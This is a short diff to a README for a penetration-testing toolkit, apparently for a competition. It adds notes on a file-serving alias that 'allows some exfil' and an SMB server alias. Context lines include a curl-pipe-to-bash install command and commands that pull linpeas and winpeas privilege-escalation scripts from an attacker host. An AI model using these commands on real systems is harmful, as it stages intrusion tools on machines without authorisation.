@@ -6,6 +6,8 @@ curl -sL https://raw.githubusercontent.com/zoeyg/cptc/main/install.sh | bash -
 
 # http server
 
+Run it with the `tools` alias and it'll serve files from `~/tools`, and allow some exfil.
+
 ## exfil
 
 ### Powershell
@@ -64,3 +66,7 @@ wget http://host:8080/winpeas.bat -outfile winpeas.bat
 curl http://host:8080/linpeas.sh -o lp.sh
 wget http://host:8080/linpeas.sh
 ```
+
+## SMB Server
+
+Serve tools from `~/tools` with the `smb` alias
